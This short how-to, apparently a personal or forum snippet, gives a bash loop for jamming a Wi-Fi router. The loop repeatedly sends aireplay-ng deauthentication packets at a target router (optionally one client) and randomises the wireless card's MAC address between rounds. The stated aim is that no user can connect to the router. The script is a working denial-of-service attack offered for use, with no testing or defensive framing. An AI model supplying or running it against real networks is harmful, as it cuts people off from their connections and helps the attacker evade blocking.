Jam a router for wifi-connections

1. Make a bash script like below 
	while true
	do
		aireplay-ng -0 5 -a [router bssid] -c [client bssid] wlan0mon
		ifconfig wlan0 down
		macchanger -r wlan0 | grep "New MAC"
		iwconfig wlan0 mode monitor
		ifconfig wlan0 up | grep Mode
		sleep 3
		echo Waiting!!!!!
	done


2. client bssid is optional unless you want to target a perticular target

this will send deauth signal to router so none of the user able to connect
to that router
